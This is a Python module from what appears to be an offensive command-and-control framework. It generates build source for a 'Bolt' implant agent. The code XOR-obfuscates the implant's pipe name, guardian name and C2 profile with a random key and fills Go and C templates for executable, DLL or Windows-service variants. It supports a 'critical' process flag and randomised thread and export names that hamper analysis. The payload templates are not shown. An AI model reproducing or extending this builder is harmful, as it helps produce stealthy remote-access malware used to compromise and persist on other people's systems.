#!/usr/bin/python3
# Copyright (C) 2021 - 2022 iDigitalFlame
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#

from secrets import token_bytes
from include.config import Config
from include.util import nes, xor
from argparse import BooleanOptionalAction
from include.builder import go_bytes, random_chars
from os.path import expanduser, expandvars, isfile, join

_LINKERS = {
    "tcp": "t",
    "pipe": "p",
    "event": "e",
    "mutex": "m",
    "mailslot": "n",
    "semaphore": "s",
}
_HELP_TEXT = """ Generates a Bolt build based on the supplied profile and behavior arguments.

 Arguments
  Build Arguments
   -T                 <thread_name>   |
   --thread
   -F                 <function_name> |
   --func

  General Arguments
   -n                 <profile_file>  |
   --profile
   -P                 <pipe_name>     |
   --pipe
   -L                                 |
   --load
   -W                 <guardian_name> |
   --guardian
   -E                 <linker_type>   |
   --linker
   -I
   --ignore
   -U
   --service
   -Y                 <service_name>  |
   --service-name

  Behavior Arguments
   -V                 <checks>        |
   --checks
   -K
   --critical
"""


class Bolt(object):
    def args_help(self):
        return _HELP_TEXT

    def check(self, cfg):
        if not isinstance(cfg["load"], bool):
            raise ValueError('"load" must be a boolean')
        if not isinstance(cfg["ignore"], bool):
            raise ValueError('"ignore" must be a boolean')
        if not isinstance(cfg["service"], bool):
            raise ValueError('"service" must be a boolean')
        if not isinstance(cfg["critical"], bool):
            raise ValueError('"critical" must be a boolean')
        if not isinstance(cfg["func"], str):
            raise ValueError('"func" must be a string')
        if not isinstance(cfg["checks"], str):
            raise ValueError('"checks" must be a string')
        if not isinstance(cfg["thread"], str):
            raise ValueError('"thread" must be a string')
        if not nes(cfg["profile"]):
            raise ValueError('"profile" must be a non-empty string')
        if cfg["load"] and not nes(cfg["pipe"]):
            raise ValueError('"pipe" must be a non-empty string')
        if not cfg["ignore"]:
            if not nes(cfg["guardian"]):
                raise ValueError('"guardian" must be a non-empty string')
            if not nes(cfg["linker"]) or cfg["linker"] not in _LINKERS:
                raise ValueError('"linker" is invalid')
        if cfg["service"] and not nes(cfg["service_name"]):
            raise ValueError('"service_name" must be a non-empty string')
        try:
            Config.from_file(cfg["profile"]).json()
        except ValueError as err:
            raise ValueError(f'"profile" "{cfg["profile"]}" is invalid: {err}') from err

    def config_load(self, cfg):
        if "load" not in cfg:
            cfg["load"] = True
        if "ignore" not in cfg:
            cfg["ignore"] = False
        if "service" not in cfg:
            cfg["service"] = False
        if "critical" not in cfg:
            cfg["critical"] = True
        if "func" not in cfg:
            cfg["func"] = ""
        if "checks" not in cfg:
            cfg["checks"] = ""
        if "thread" not in cfg:
            cfg["thread"] = ""
        if "profile" not in cfg:
            cfg["profile"] = ""
        if "pipe" not in cfg:
            cfg["pipe"] = ""
        if "guardian" not in cfg:
            cfg["guardian"] = ""
        if "linker" not in cfg:
            cfg["linker"] = "event"
        if "service_name" not in cfg:
            cfg["service_name"] = ""

    def args_pre(self, parser):
        parser.add("-P", "--pipe", dest="bolt_pipe", type=str)
        parser.add("-F", "--func", dest="bolt_func", type=str)
        parser.add("-V", "--checks", dest="bolt_checks", type=str)
        parser.add("-T", "--thread", dest="bolt_thread", type=str)
        parser.add("-n", "--profile", dest="bolt_profile", type=str)
        parser.add("-W", "--guardian", dest="bolt_guardian", type=str)
        parser.add("-Y", "--service-name", dest="bolt_service_name", type=str)
        parser.add("-L", "--load", dest="bolt_load", action=BooleanOptionalAction)
        parser.add("-E", "--linker", dest="bolt_linker", type=str, choices=_LINKERS)
        parser.add("-I", "--ignore", dest="bolt_ignore", action=BooleanOptionalAction)
        parser.add("-U", "--service", dest="bolt_service", action=BooleanOptionalAction)
        parser.add(
            "-K", "--critical", dest="bolt_critical", action=BooleanOptionalAction
        )

    def args_post(self, cfg, args):
        if nes(args.bolt_pipe):
            cfg["pipe"] = args.bolt_pipe
        if nes(args.bolt_func):
            cfg["func"] = args.bolt_func
        if nes(args.bolt_checks):
            cfg["checks"] = args.bolt_checks
        if nes(args.bolt_thread):
            cfg["thread"] = args.bolt_thread
        if nes(args.bolt_linker):
            if args.bolt_linker.lower() not in _LINKERS:
                raise ValueError('bolt "linker" is not valid')
            cfg["linker"] = args.bolt_linker.lower()
        if nes(args.bolt_profile):
            v = expandvars(expanduser(args.bolt_profile))
            if not isfile(v):
                raise ValueError(f'"bolt_profile" value "{v}" is not a file')
            cfg["profile"] = args.bolt_profile
            del v
        if nes(args.bolt_guardian):
            cfg["guardian"] = args.bolt_guardian
        if nes(args.bolt_service_name):
            cfg["service_name"] = args.bolt_service_name
        if isinstance(args.bolt_load, bool):
            cfg["load"] = args.bolt_load
        if isinstance(args.bolt_ignore, bool):
            cfg["ignore"] = args.bolt_ignore
        if isinstance(args.bolt_service, bool):
            cfg["service"] = args.bolt_service
        if isinstance(args.bolt_critical, bool):
            cfg["critical"] = args.bolt_critical

    def run(self, cfg, base, _, templates):
        k = token_bytes(64)
        e = _LINKERS[cfg["linker"]]
        p = xor(k, cfg["pipe"].encode("UTF-8"))
        g = xor(k, cfg["guardian"].encode("UTF-8"))
        n = xor(k, Config.from_file(cfg["profile"]))
        t = "bolt.go"
        if cfg["service"] and nes(cfg["service_name"]):
            t = "bolt_service.go"
        c = cfg["checks"]
        if not nes(c):
            c = "false"
        d = templates[t].substitute(
            checks=c,
            event=f'"{e}"',
            key=go_bytes(k),
            pipe=go_bytes(p),
            guard=go_bytes(g),
            profile=go_bytes(n),
            service=f'"{cfg["service_name"]}"',
            load="true" if cfg["load"] else "false",
            ignore="true" if cfg["ignore"] else "false",
            critical="true" if cfg["critical"] else "false",
        )
        del k, e, p, g, n, t
        p = join(base, "bolt.go")
        with open(p, "w") as f:
            f.write(d)
        del d
        return p

    def print_options(self, cfg, root, file):
        print("- | Bolt Generator", file=file)
        print(f'- | = {"Profile:":20}{cfg["profile"]}', file=file)
        print(f'- | = {"Critical:":20}{cfg["critical"]}', file=file)
        print(f'- | = {"Load:":20}{cfg["load"]}', file=file)
        if cfg["load"]:
            print(f'- | = {"Pipe:":20}{cfg["pipe"]}', file=file)
        print(f'- | = {"Ignore:":20}{cfg["ignore"]}', file=file)
        if not cfg["ignore"]:
            print(f'- | = {"Linker:":20}{cfg["linker"].title()}', file=file)
            print(f'- | = {"Guardian:":20}{cfg["guardian"]}', file=file)
        print(f'- | = {"Service:":20}{cfg["service"]}', file=file)
        if cfg["service"]:
            print(f'- | = {"Service Name:":20}{cfg["service_name"]}', file=file)
        if not root.get_option("cgo"):
            return
        if nes(cfg["thread"]):
            print(f'- | = {"CGO Thread:":20}{cfg["thread"]}', file=file)
        else:
            print(f'- | = {"CGO Thread:":20}[random]', file=file)
        if nes(cfg["func"]):
            print(f'- | = {"CGO Func:":20}{cfg["func"]}', file=file)
        else:
            print(f'- | = {"CGO Func:":20}[random]', file=file)

    def run_cgo(self, export, cfg, base, workspace, templates):
        t = "bolt.c"
        if workspace["library"]:
            if cfg["service"] and nes(cfg["service_name"]):
                t = "bolt_dll_service.c"
            else:
                t = "bolt_dll.c"
        n, f = cfg["thread"], cfg["func"]
        if not nes(n):
            n = random_chars(12)
        if not nes(f):
            f = random_chars(12)
        d = templates[t].substitute(
            thread=n, export=export, funcname=f, secondary=workspace["secondary"]
        )
        del t, n, f
        p = join(base, "entry.c")
        with open(p, "w") as f:
            f.write(d)
        del d
        return (p, "bolt")